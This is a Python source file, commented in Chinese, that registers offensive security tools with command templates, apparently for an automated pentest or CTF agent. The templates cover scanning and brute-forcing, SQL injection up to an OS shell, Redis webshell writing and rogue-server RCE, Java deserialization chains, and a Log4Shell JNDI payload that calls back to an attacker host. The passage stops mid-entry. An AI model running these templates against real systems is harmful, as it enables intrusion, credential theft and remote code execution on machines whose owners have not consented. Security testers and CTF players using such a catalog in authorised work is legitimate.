"""外部安全工具注册表 — 定义所有可集成的真实开源工具。

每个工具包含:
- 安装方式 (pip/go/git/brew/binary/jar)
- 可执行文件名或jar路径 (用于检测是否已安装)
- 使用模板 (带占位符的命令行模板)
- 适用场景关键词 (用于自动匹配)
- 优先级 (同类工具的推荐顺序)
- when_to_use (何时使用的中文说明)

远程服务器路径约定:
  Go 工具      → ~/go/bin/
  jar 工具     → ~/tools/java_exploit/
  git/py 工具  → ~/tools/recon/ | ~/tools/vuln_exploit/ | ~/tools/intranet/ | ~/tools/tunnel/ | ~/tools/privesc/
  已有 git 工具 → ~/tools/SSTImap/ | ~/tools/jwt_tool/ | ~/tools/Gopherus/ 等
  字典          → ~/tools/SecLists/ | ~/tools/PayloadsAllTheThings/ | ~/tools/intranet/rockyou.txt
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

TOOLS_DIR = os.path.expanduser("~/tools")


@dataclass
class ExternalTool:
    """描述一个可集成的外部安全工具。"""

    id: str
    name: str
    description: str
    category: str  # recon / scanner / exploit / fuzzer / util / java / intranet / tunnel / privesc
    keywords: list[str]
    binary: str  # 可执行文件名 (which 检测) 或文件路径
    install_cmd: str
    install_type: str  # pip / go / git / apt / binary / jar
    usage_templates: list[dict[str, str]]  # {"desc": ..., "cmd": ...}
    when_to_use: str = ""
    priority: int = 5  # 1=最高 10=最低
    project_url: str = ""
    notes: str = ""


# ═══════════════════════════════════════════════════════════════
# 工具注册表 — 按分类组织
# ═══════════════════════════════════════════════════════════════

TOOLS: list[ExternalTool] = [

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  漏洞扫描 (scanner)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="nuclei",
        name="Nuclei",
        description="基于YAML模板的高性能漏洞扫描器，9000+模板覆盖CVE/默认凭据/暴露面",
        category="scanner",
        keywords=["漏洞扫描", "cve", "nuclei", "模板扫描", "批量扫描", "默认凭据", "暴露面"],
        binary="nuclei",
        install_cmd="go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        install_type="go",
        priority=1,
        project_url="https://github.com/projectdiscovery/nuclei",
        when_to_use="拿到目标URL后第一步就用nuclei做全面漏扫；识别技术栈后用-tags指定标签精准扫描",
        usage_templates=[
            {"desc": "全面扫描(高危)", "cmd": "nuclei -u {target} -severity critical,high -silent -nc"},
            {"desc": "CVE扫描", "cmd": "nuclei -u {target} -t cves/ -severity critical,high -silent -nc"},
            {"desc": "暴露面检测", "cmd": "nuclei -u {target} -t exposures/ -silent -nc"},
            {"desc": "默认凭据", "cmd": "nuclei -u {target} -t default-logins/ -silent -nc"},
            {"desc": "技术识别", "cmd": "nuclei -u {target} -t technologies/ -silent -nc"},
            {"desc": "指定标签扫描", "cmd": "nuclei -u {target} -tags {tag} -silent -nc"},
            {"desc": "批量URL扫描", "cmd": "nuclei -l {url_file} -severity critical,high -silent -nc -c 30"},
        ],
        notes="先 nuclei -update-templates 更新模板。常用tags: spring,struts,thinkphp,shiro,nacos,weblogic,tomcat,confluence,yonyou,weaver,seeyon,tongda,finereport",
    ),
    ExternalTool(
        id="afrog",
        name="afrog",
        description="高性能漏洞扫描器，内置大量国产系统POC(帆软/用友/泛微/致远等)",
        category="scanner",
        keywords=["漏洞扫描", "afrog", "poc", "批量", "国产系统", "帆软", "用友", "泛微"],
        binary="afrog",
        install_cmd="go install github.com/zan8in/afrog/v3/cmd/afrog@latest",
        install_type="go",
        priority=2,
        project_url="https://github.com/zan8in/afrog",
        when_to_use="目标是国产系统(OA/ERP/CMS)时用afrog扫描，POC覆盖国内常见漏洞比nuclei更全",
        usage_templates=[
            {"desc": "全面扫描", "cmd": "afrog -t {target} -severity critical,high"},
            {"desc": "批量扫描", "cmd": "afrog -T {url_file} -severity critical,high"},
        ],
    ),
    ExternalTool(
        id="fscan",
        name="fscan",
        description="内网综合扫描器，集成端口扫描/服务识别/漏洞检测/暴力破解，一键打内网",
        category="scanner",
        keywords=["内网扫描", "fscan", "端口", "暴力破解", "服务识别", "综合扫描", "横向"],
        binary=f"{TOOLS_DIR}/recon/fscan",
        install_cmd="",
        install_type="binary",
        priority=1,
        project_url="https://github.com/shadow1ng/fscan",
        when_to_use="进入内网后第一个工具；快速扫描网段发现存活主机、开放服务和常见漏洞",
        usage_templates=[
            {"desc": "内网快速扫描", "cmd": f"{TOOLS_DIR}/recon/fscan -h {{target}}/24"},
            {"desc": "指定端口扫描", "cmd": f"{TOOLS_DIR}/recon/fscan -h {{target}} -p 22,80,443,3306,6379,8080"},
            {"desc": "全端口+暴破", "cmd": f"{TOOLS_DIR}/recon/fscan -h {{target}}/24 -p 1-65535 -pwd {{password_file}}"},
            {"desc": "Web漏洞检测", "cmd": f"{TOOLS_DIR}/recon/fscan -h {{target}} -m web"},
        ],
        notes="fscan 集成了 MS17-010/SMB/Redis/MySQL/SSH 等常见漏洞检测和暴破，非常适合内网第一步",
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  侦察 / 信息收集 (recon)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="httpx",
        name="httpx",
        description="高性能HTTP探测，批量检测存活/标题/状态码/技术栈/证书",
        category="recon",
        keywords=["http探测", "存活检测", "httpx", "标题", "状态码", "技术栈", "指纹"],
        binary="httpx",
        install_cmd="go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
        install_type="go",
        priority=1,
        project_url="https://github.com/projectdiscovery/httpx",
        when_to_use="拿到IP/域名列表后批量探测存活和技术栈；配合subfinder/naabu做信息收集流水线",
        usage_templates=[
            {"desc": "探测存活+标题+技术栈", "cmd": "echo '{target}' | httpx -title -status-code -tech-detect -silent"},
            {"desc": "批量探测", "cmd": "cat {url_file} | httpx -title -status-code -tech-detect -silent -threads 50"},
            {"desc": "JSON详细输出", "cmd": "echo '{target}' | httpx -title -status-code -content-length -tech-detect -web-server -silent -json"},
        ],
    ),
    ExternalTool(
        id="naabu",
        name="naabu",
        description="高速端口扫描器，比nmap快5-10倍，适合大规模资产端口发现",
        category="recon",
        keywords=["端口扫描", "port scan", "naabu", "端口"],
        binary="naabu",
        install_cmd="go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
        install_type="go",
        priority=2,
        project_url="https://github.com/projectdiscovery/naabu",
        when_to_use="快速发现目标开放端口，比nmap更适合大范围扫描；可管道接httpx做端口→Web联动",
        usage_templates=[
            {"desc": "常用端口扫描", "cmd": "naabu -host {target} -top-ports 1000 -silent"},
            {"desc": "全端口扫描", "cmd": "naabu -host {target} -p - -silent"},
            {"desc": "端口→httpx联动", "cmd": "naabu -host {target} -top-ports 1000 -silent | httpx -title -status-code -silent"},
        ],
    ),
    ExternalTool(
        id="subfinder",
        name="subfinder",
        description="被动子域名枚举，聚合多个在线数据源",
        category="recon",
        keywords=["子域名", "subdomain", "subfinder", "枚举"],
        binary="subfinder",
        install_cmd="go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
        install_type="go",
        priority=2,
        project_url="https://github.com/projectdiscovery/subfinder",
        when_to_use="目标给的是域名时枚举子域，发现更多攻击面",
        usage_templates=[
            {"desc": "枚举子域名", "cmd": "subfinder -d {domain} -silent"},
            {"desc": "子域→httpx联动", "cmd": "subfinder -d {domain} -silent | httpx -title -status-code -silent"},
        ],
    ),
    ExternalTool(
        id="nmap",
        name="nmap",
        description="网络扫描和安全审计，端口扫描/服务识别/OS检测/脚本扫描",
        category="recon",
        keywords=["端口", "扫描", "nmap", "服务", "版本", "指纹"],
        binary="nmap",
        install_cmd="apt install -y nmap",
        install_type="apt",
        priority=1,
        project_url="https://nmap.org/",
        when_to_use="需要精确服务版本识别时使用；内网扫描时配合-sV做服务指纹识别",
        usage_templates=[
            {"desc": "快速版本扫描", "cmd": "nmap -sV -sC -T4 {target}"},
            {"desc": "全端口扫描", "cmd": "nmap -p- -T4 --min-rate=1000 {target}"},
            {"desc": "漏洞脚本扫描", "cmd": "nmap -sV --script=vulners,vuln {target}"},
            {"desc": "内网存活探测", "cmd": "nmap -sn {subnet}/24"},
        ],
    ),
    ExternalTool(
        id="gau",
        name="gau",
        description="Get All URLs — 从多个公共数据源收集目标URL历史记录",
        category="recon",
        keywords=["url收集", "gau", "历史url", "wayback", "信息收集"],
        binary=f"{TOOLS_DIR}/recon/gau",
        install_cmd="",
        install_type="binary",
        priority=3,
        project_url="https://github.com/lc/gau",
        when_to_use="收集目标域名的历史URL，发现隐藏端点、旧版本页面、参数模式",
        usage_templates=[
            {"desc": "收集所有历史URL", "cmd": f"{TOOLS_DIR}/recon/gau {{domain}}"},
            {"desc": "过滤指定扩展名", "cmd": f"{TOOLS_DIR}/recon/gau {{domain}} --blacklist png,jpg,gif,css,woff"},
        ],
    ),
    ExternalTool(
        id="jjjjjjjjjjjjjs",
        name="jjjjjjjjjjjjjs",
        description="JS文件敏感信息提取工具，自动从JS中提取API/密钥/Token/路径",
        category="recon",
        keywords=["js分析", "javascript", "api", "密钥", "token", "信息泄露", "jjjs"],
        binary=f"{TOOLS_DIR}/recon/jjjjjjjjjjjjjs_linux_amd64_v2.4.0",
        install_cmd="",
        install_type="binary",
        priority=2,
        project_url="https://github.com/BishopFox/jsluice",
        when_to_use="目标有前端JS时提取API端点、密钥泄露、隐藏路径；配合httpx做JS中发现的URL验证",
        usage_templates=[
            {"desc": "提取JS中的URL", "cmd": f"echo '{{target}}' | {TOOLS_DIR}/recon/jjjjjjjjjjjjjs_linux_amd64_v2.4.0"},
        ],
    ),
    ExternalTool(
        id="sbscan",
        name="SBSCAN",
        description="SpringBoot漏洞扫描器，检测Actuator泄露/Heapdump/Env敏感信息/RCE",
        category="recon",
        keywords=["springboot", "actuator", "heapdump", "env", "sbscan", "spring"],
        binary=f"{TOOLS_DIR}/recon/SBSCAN/sbscan.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/sule01u/SBSCAN",
        when_to_use="识别到SpringBoot应用时立即使用，检测Actuator泄露/Heapdump/Env等敏感端点",
        usage_templates=[
            {"desc": "SpringBoot扫描", "cmd": f"python3 {TOOLS_DIR}/recon/SBSCAN/sbscan.py -u {{target}}"},
            {"desc": "批量扫描", "cmd": f"python3 {TOOLS_DIR}/recon/SBSCAN/sbscan.py -f {{url_file}}"},
        ],
        notes="发现actuator/heapdump后用dumpall提取密码和AK/SK",
    ),
    ExternalTool(
        id="dumpall",
        name="dumpall",
        description="SpringBoot Actuator信息提取工具，自动解析heapdump/env/mappings",
        category="recon",
        keywords=["heapdump", "actuator", "dumpall", "springboot", "env", "密码提取"],
        binary="dumpall",
        install_cmd="pip install dumpall",
        install_type="pip",
        priority=1,
        project_url="https://github.com/0xHJK/dumpall",
        when_to_use="发现SpringBoot Actuator端点后用dumpall提取heapdump中的数据库密码/AK/SK/Token",
        usage_templates=[
            {"desc": "dump所有信息", "cmd": "dumpall -u {target}/actuator"},
            {"desc": "提取heapdump", "cmd": "dumpall -u {target}/actuator/heapdump"},
        ],
    ),
    ExternalTool(
        id="githack",
        name="GitHack",
        description=".git泄露利用，下载并还原Git仓库源码(含完整历史记录)",
        category="recon",
        keywords=["git", "泄露", "源码", ".git", "还原", "githack", "信息泄露"],
        binary=f"{TOOLS_DIR}/recon/GitHack/GitHack.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/BugScanTeam/GitHack",
        when_to_use="发现目标存在.git目录泄露(访问/.git/config返回200)时使用",
        usage_templates=[
            {"desc": "还原git仓库", "cmd": f"python3 {TOOLS_DIR}/recon/GitHack/GitHack.py {{target}}/.git/"},
        ],
        notes="还原后cd到输出目录，用git log --all查看历史提交，git show <hash>查看diff找密码/flag",
    ),
    ExternalTool(
        id="springboot_scan",
        name="SpringBoot-Scan",
        description="SpringBoot信息泄露扫描，检测Spring相关敏感端点和配置",
        category="recon",
        keywords=["springboot", "spring", "信息泄露", "配置泄露"],
        binary=f"{TOOLS_DIR}/recon/SpringBoot-Scan/SpringBoot-Scan.py",
        install_cmd="",
        install_type="git",
        priority=2,
        project_url="https://github.com/AabyssZG/SpringBoot-Scan",
        when_to_use="疑似SpringBoot应用时做信息泄露检测，配合SBSCAN使用",
        usage_templates=[
            {"desc": "SpringBoot扫描", "cmd": f"python3 {TOOLS_DIR}/recon/SpringBoot-Scan/SpringBoot-Scan.py -u {{target}}"},
        ],
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  Fuzzing / 目录发现 (fuzzer)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="ffuf",
        name="ffuf",
        description="高速Web Fuzzer，目录发现/参数爆破/虚拟主机发现",
        category="fuzzer",
        keywords=["目录扫描", "fuzz", "ffuf", "路径发现", "参数爆破", "dirbust"],
        binary="ffuf",
        install_cmd="go install github.com/ffuf/ffuf/v2@latest",
        install_type="go",
        priority=1,
        project_url="https://github.com/ffuf/ffuf",
        when_to_use="目录和路径发现首选；参数模糊测试；密码爆破；比dirsearch更快更灵活",
        usage_templates=[
            {"desc": "目录发现", "cmd": f"ffuf -u {{target}}/FUZZ -w {TOOLS_DIR}/SecLists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -t 50 -s"},
            {"desc": "扩展名爆破", "cmd": f"ffuf -u {{target}}/FUZZ -w {TOOLS_DIR}/SecLists/Discovery/Web-Content/raft-medium-words.txt -e .php,.html,.txt,.bak,.zip,.sql -mc 200 -t 50 -s"},
            {"desc": "参数发现", "cmd": f"ffuf -u '{{target}}?FUZZ=test' -w {TOOLS_DIR}/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs {{filter_size}} -t 50 -s"},
            {"desc": "POST参数Fuzz", "cmd": f"ffuf -u {{target}} -X POST -d 'FUZZ=test' -w {TOOLS_DIR}/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -t 50 -s"},
            {"desc": "密码爆破", "cmd": "ffuf -u {target} -X POST -d 'username=admin&password=FUZZ' -w /tmp/top100.txt -mc 302 -t 10 -s"},
        ],
    ),
    ExternalTool(
        id="dirsearch",
        name="dirsearch",
        description="Web路径扫描器，自带丰富字典，支持递归扫描",
        category="fuzzer",
        keywords=["目录扫描", "dirsearch", "路径", "后台", "备份文件"],
        binary="dirsearch",
        install_cmd="pip install dirsearch",
        install_type="pip",
        priority=2,
        project_url="https://github.com/maurosoria/dirsearch",
        when_to_use="自带字典丰富，适合快速扫描；不需要额外字典文件",
        usage_templates=[
            {"desc": "标准扫描", "cmd": "dirsearch -u {target} -e php,asp,jsp,html,txt,bak,zip -t 20 --format=plain -q"},
            {"desc": "递归扫描", "cmd": "dirsearch -u {target} -e php -r -R 3 -t 20 --format=plain -q"},
        ],
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  Web漏洞利用 (exploit)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="sqlmap",
        name="sqlmap",
        description="自动化SQL注入检测与利用，支持所有主流数据库，可获取数据/OS Shell",
        category="exploit",
        keywords=["sql注入", "sqli", "sqlmap", "数据库", "注入", "dump", "os-shell"],
        binary="sqlmap",
        install_cmd="pip install sqlmap",
        install_type="pip",
        priority=1,
        project_url="https://github.com/sqlmapproject/sqlmap",
        when_to_use="发现SQL注入点后自动化利用；从请求文件导入测试；需要dump数据库内容时",
        usage_templates=[
            {"desc": "GET注入检测", "cmd": "sqlmap -u '{target}' --batch --dbs --random-agent"},
            {"desc": "POST注入", "cmd": "sqlmap -u '{target}' --data='{post_data}' --batch --dbs"},
            {"desc": "dump数据", "cmd": "sqlmap -u '{target}' --batch -D {db} -T {table} --dump"},
            {"desc": "获取Shell", "cmd": "sqlmap -u '{target}' --batch --os-shell --random-agent"},
            {"desc": "从请求文件", "cmd": "sqlmap -r {request_file} --batch --level=5 --risk=3"},
            {"desc": "Tamper绕WAF", "cmd": "sqlmap -u '{target}' --batch --tamper=space2comment,between --dbs"},
        ],
    ),
    ExternalTool(
        id="fenjing",
        name="焚靖 (Fenjing)",
        description="Jinja2 SSTI 自动化检测+WAF绕过，CTF神器，自动分析过滤规则生成绕过Payload",
        category="exploit",
        keywords=["ssti", "模板注入", "jinja2", "flask", "fenjing", "waf绕过", "焚靖"],
        binary="fenjing",
        install_cmd="pip install fenjing",
        install_type="pip",
        priority=1,
        project_url="https://github.com/Marven11/Fenjing",
        when_to_use="发现Flask/Jinja2 SSTI时首选；有WAF过滤时能自动生成绕过payload",
        usage_templates=[
            {"desc": "自动检测+利用", "cmd": "fenjing crack --url '{target}' --method GET --inputs name"},
            {"desc": "扫描模式", "cmd": "fenjing scan --url '{target}'"},
        ],
        notes="CTF中SSTI首选工具。能自动分析WAF过滤规则并绕过。",
    ),
    ExternalTool(
        id="sstimap",
        name="SSTImap",
        description="多引擎SSTI检测利用，支持Jinja2/Mako/Twig/Smarty/FreeMarker等15+引擎",
        category="exploit",
        keywords=["ssti", "模板注入", "sstimap", "twig", "smarty", "freemarker", "mako"],
        binary=f"{TOOLS_DIR}/SSTImap/sstimap.py",
        install_cmd="",
        install_type="git",
        priority=2,
        project_url="https://github.com/vladko312/SSTImap",
        when_to_use="非Jinja2的SSTI(Twig/Smarty/FreeMarker/Velocity等)用SSTImap；Jinja2优先用fenjing",
        usage_templates=[
            {"desc": "自动检测+利用", "cmd": f"python3 {TOOLS_DIR}/SSTImap/sstimap.py -u '{{target}}?name=test'"},
            {"desc": "OS命令执行", "cmd": f"python3 {TOOLS_DIR}/SSTImap/sstimap.py -u '{{target}}?name=test' --os-cmd 'cat /flag'"},
        ],
    ),
    ExternalTool(
        id="flask_unsign",
        name="flask-unsign",
        description="Flask Session Cookie解码/爆破密钥/伪造工具",
        category="exploit",
        keywords=["flask", "session", "cookie", "伪造", "签名", "secret_key", "flask-unsign"],
        binary="flask-unsign",
        install_cmd="pip install flask-unsign[wordlist]",
        install_type="pip",
        priority=1,
        project_url="https://github.com/Paradoxis/Flask-Unsign",
        when_to_use="目标是Flask应用且有session cookie时：解码查看内容→爆破密钥→伪造admin",
        usage_templates=[
            {"desc": "解码Cookie", "cmd": "flask-unsign --decode --cookie '{cookie}'"},
            {"desc": "爆破密钥", "cmd": f"flask-unsign --unsign --cookie '{{cookie}}' --wordlist {TOOLS_DIR}/intranet/rockyou.txt --no-literal-eval"},
            {"desc": "短字典爆破", "cmd": "flask-unsign --unsign --cookie '{cookie}' --wordlist /tmp/flask_keys.txt --no-literal-eval"},
            {"desc": "伪造Cookie", "cmd": "flask-unsign --sign --cookie '{payload}' --secret '{secret}'"},
        ],
        notes="流程: decode→unsign爆破→sign伪造admin。常见弱密钥: secret,password,key,flask,app",
    ),
    ExternalTool(
        id="jwt_tool",
        name="jwt_tool",
        description="JWT安全测试，支持alg:none/密钥爆破/RS256→HS256混淆/KID注入",
        category="exploit",
        keywords=["jwt", "token", "json web token", "alg", "none", "密钥", "jwt_tool"],
        binary=f"{TOOLS_DIR}/jwt_tool/jwt_tool.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/ticarpi/jwt_tool",
        when_to_use="目标使用JWT认证时：全自动扫描→alg:none→弱密钥爆破→RS256混淆",
        usage_templates=[
            {"desc": "全自动扫描", "cmd": f"python3 {TOOLS_DIR}/jwt_tool/jwt_tool.py {{token}} -M at"},
            {"desc": "alg:none攻击", "cmd": f"python3 {TOOLS_DIR}/jwt_tool/jwt_tool.py {{token}} -X a"},
            {"desc": "弱密钥爆破", "cmd": f"python3 {TOOLS_DIR}/jwt_tool/jwt_tool.py {{token}} -C -d {TOOLS_DIR}/intranet/rockyou.txt"},
            {"desc": "RS256→HS256", "cmd": f"python3 {TOOLS_DIR}/jwt_tool/jwt_tool.py {{token}} -X k -pk {{public_key_file}}"},
            {"desc": "篡改payload", "cmd": f"python3 {TOOLS_DIR}/jwt_tool/jwt_tool.py {{token}} -T -S hs256 -p '{{secret}}'"},
        ],
    ),
    ExternalTool(
        id="git_dumper",
        name="git-dumper",
        description=".git泄露利用，下载并还原完整Git仓库(含历史版本)",
        category="exploit",
        keywords=["git", "泄露", "源码", ".git", "还原", "dumper", "信息泄露"],
        binary="git-dumper",
        install_cmd="pip install git-dumper",
        install_type="pip",
        priority=1,
        project_url="https://github.com/arthaud/git-dumper",
        when_to_use="发现.git泄露时使用，比GitHack更稳定；还原后查看历史提交找密码/flag",
        usage_templates=[
            {"desc": "还原.git仓库", "cmd": "git-dumper {target}/.git/ /tmp/git-dump-output"},
            {"desc": "查看历史", "cmd": "cd /tmp/git-dump-output && git log --oneline && git diff HEAD~1"},
        ],
        notes="还原后用 git log --all 查看所有提交, git show <commit> 查看diff, git stash list 看stash",
    ),
    ExternalTool(
        id="gopherus",
        name="Gopherus",
        description="Gopher协议Payload生成，配合SSRF攻击Redis/MySQL/FastCGI/SMTP",
        category="exploit",
        keywords=["gopher", "ssrf", "redis", "mysql", "fastcgi", "内网", "gopherus"],
        binary=f"{TOOLS_DIR}/Gopherus/gopherus.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/tarunkant/Gopherus",
        when_to_use="发现SSRF漏洞后利用gopher://协议攻击内网Redis/MySQL/FastCGI等服务",
        usage_templates=[
            {"desc": "攻击Redis写Webshell", "cmd": f"python2 {TOOLS_DIR}/Gopherus/gopherus.py --exploit redis"},
            {"desc": "攻击MySQL", "cmd": f"python2 {TOOLS_DIR}/Gopherus/gopherus.py --exploit mysql"},
            {"desc": "攻击FastCGI", "cmd": f"python2 {TOOLS_DIR}/Gopherus/gopherus.py --exploit fastcgi"},
        ],
        notes="需Python2。生成的URL放入SSRF参数使用，可能需要二次URL编码",
    ),
    ExternalTool(
        id="phpggc",
        name="phpggc",
        description="PHP反序列化Gadget链生成器，支持Laravel/Symfony/Yii/WordPress等40+框架",
        category="exploit",
        keywords=["php", "反序列化", "phpggc", "gadget", "laravel", "symfony", "unserialize"],
        binary=f"{TOOLS_DIR}/vuln_exploit/phpggc/phpggc",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/ambionics/phpggc",
        when_to_use="PHP反序列化漏洞时生成payload；识别到PHP框架后查看可用的gadget链",
        usage_templates=[
            {"desc": "列出可用链", "cmd": f"php {TOOLS_DIR}/vuln_exploit/phpggc/phpggc -l"},
            {"desc": "Laravel RCE", "cmd": f"php {TOOLS_DIR}/vuln_exploit/phpggc/phpggc Laravel/RCE1 system 'cat /flag' -b"},
            {"desc": "Symfony RCE", "cmd": f"php {TOOLS_DIR}/vuln_exploit/phpggc/phpggc Symfony/RCE4 system 'cat /flag' -b"},
            {"desc": "生成phar", "cmd": f"php {TOOLS_DIR}/vuln_exploit/phpggc/phpggc Laravel/RCE1 system 'cat /flag' -p phar -o /tmp/exploit.phar"},
        ],
        notes="先用 -l 列出所有可用链, -i <chain> 查看链详情, -b 生成base64",
    ),
    ExternalTool(
        id="redis_writefile",
        name="RedisWriteFile",
        description="Redis未授权写文件利用，写Webshell/SSH Key/Crontab",
        category="exploit",
        keywords=["redis", "未授权", "写文件", "webshell", "ssh key", "crontab", "6379"],
        binary=f"{TOOLS_DIR}/vuln_exploit/RedisWriteFile/RedisWriteFile.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/Ridter/RedisWriteFile",
        when_to_use="发现Redis未授权访问(6379端口无密码)时，写Webshell/SSH公钥/定时任务获取权限",
        usage_templates=[
            {"desc": "写Webshell", "cmd": f"python3 {TOOLS_DIR}/vuln_exploit/RedisWriteFile/RedisWriteFile.py --rhost {{target}} --rport 6379 --lhost {{attacker_ip}} --rpath /var/www/html/ --rfile shell.php --lfile /tmp/shell.php"},
        ],
    ),
    ExternalTool(
        id="redis_rogue",
        name="redis-rogue-server",
        description="Redis主从复制RCE，通过rogue server加载恶意.so执行命令",
        category="exploit",
        keywords=["redis", "主从复制", "rce", "未授权", "rogue", "6379"],
        binary=f"{TOOLS_DIR}/redis-rogue-server/redis-rogue-server.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/n0b0dyCN/redis-rogue-server",
        when_to_use="Redis未授权时的RCE方式；比写文件更直接，通过主从复制加载恶意模块执行系统命令",
        usage_templates=[
            {"desc": "主从复制RCE", "cmd": f"python3 {TOOLS_DIR}/redis-rogue-server/redis-rogue-server.py --rhost {{target}} --lhost {{attacker_ip}} --exp {TOOLS_DIR}/redis-rogue-server/exp.so"},
        ],
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  Java 漏洞利用 (java)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="ysoserial",
        name="ysoserial",
        description="Java反序列化Payload生成器，CC/CB/Rome/JRMP等Gadget Chain",
        category="java",
        keywords=["java", "反序列化", "ysoserial", "gadget", "cc链", "cb链", "序列化"],
        binary=f"{TOOLS_DIR}/ysoserial-all.jar",
        install_cmd="",
        install_type="jar",
        priority=1,
        project_url="https://github.com/frohoff/ysoserial",
        when_to_use="Java反序列化漏洞时生成payload；先URLDNS探测→确认存在后用CC6/CB1链RCE",
        usage_templates=[
            {"desc": "URLDNS探测(无害)", "cmd": f"java -jar {TOOLS_DIR}/ysoserial-all.jar URLDNS '{{dnslog_url}}' | base64 -w0"},
            {"desc": "CC6链RCE", "cmd": f"java -jar {TOOLS_DIR}/ysoserial-all.jar CommonsCollections6 '{{command}}' | base64 -w0"},
            {"desc": "CB链(Shiro用)", "cmd": f"java -jar {TOOLS_DIR}/ysoserial-all.jar CommonsBeanutils1 '{{command}}' | base64 -w0"},
            {"desc": "JRMP客户端", "cmd": f"java -jar {TOOLS_DIR}/ysoserial-all.jar JRMPClient '{{attacker_ip}}:{{port}}' | base64 -w0"},
        ],
        notes="选链: 有CC3.x用CC6, CC4.x用CC2, Shiro优先CB链, 先URLDNS探测确认",
    ),
    ExternalTool(
        id="ysomap",
        name="ysomap",
        description="ysoserial增强版，交互式Java利用框架，支持更多Gadget和Bullet组合",
        category="java",
        keywords=["java", "反序列化", "ysomap", "gadget", "利用框架"],
        binary=f"{TOOLS_DIR}/java_exploit/ysomap.jar",
        install_cmd="",
        install_type="jar",
        priority=2,
        project_url="https://github.com/wh1t3p1g/ysomap",
        when_to_use="ysoserial不够用时的增强替代；需要更复杂的利用链组合时",
        usage_templates=[
            {"desc": "交互式使用", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/ysomap.jar"},
        ],
    ),
    ExternalTool(
        id="jndi_exploit",
        name="JNDIExploit",
        description="JNDI注入利用工具，一键启动LDAP/RMI服务器，配合Log4Shell/Fastjson/WebLogic",
        category="java",
        keywords=["jndi", "ldap", "rmi", "log4j", "log4shell", "fastjson", "反序列化"],
        binary=f"{TOOLS_DIR}/java_exploit/JNDIExploit.jar",
        install_cmd="",
        install_type="jar",
        priority=1,
        project_url="https://github.com/Mr-xn/JNDIExploit-1",
        when_to_use="Log4j/Fastjson/WebLogic等JNDI注入漏洞的利用端；先启动服务再触发目标连接",
        usage_templates=[
            {"desc": "启动JNDI服务", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/JNDIExploit.jar -i {{attacker_ip}} -p 8888"},
            {"desc": "Log4j触发payload", "cmd": "${{jndi:ldap://{attacker_ip}:1389/Basic/Command/Base64/{base64cmd}}}"},
        ],
        notes="先启动JNDIExploit监听，再在目标JNDI注入点触发连接。支持多种回连方式",
    ),
    ExternalTool(
        id="jndi_injection",
        name="JNDI-Injection-Exploit",
        description="JNDI注入利用备选方案，自动生成恶意LDAP/RMI/HTTP服务",
        category="java",
        keywords=["jndi", "ldap", "rmi", "注入"],
        binary=f"{TOOLS_DIR}/java_exploit/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar",
        install_cmd="",
        install_type="jar",
        priority=2,
        when_to_use="JNDIExploit不生效时的备选JNDI利用工具",
        usage_templates=[
            {"desc": "启动服务+命令", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C '{{command}}' -A {{attacker_ip}}"},
        ],
    ),
    ExternalTool(
        id="marshalsec",
        name="marshalsec",
        description="Java反序列化利用辅助，启动LDAP/RMI/HTTP Ref服务器",
        category="java",
        keywords=["marshalsec", "ldap", "rmi", "反序列化", "jndi", "ref"],
        binary=f"{TOOLS_DIR}/java_exploit/marshalsec-0.0.3-SNAPSHOT-all.jar",
        install_cmd="",
        install_type="jar",
        priority=2,
        project_url="https://github.com/mbechler/marshalsec",
        when_to_use="需要自定义LDAP/RMI Ref服务器时（配合自编译恶意class使用）",
        usage_templates=[
            {"desc": "启动LDAP Ref服务", "cmd": f"java -cp {TOOLS_DIR}/java_exploit/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://{{attacker_ip}}:{{http_port}}/#ExploitClass' {{ldap_port}}"},
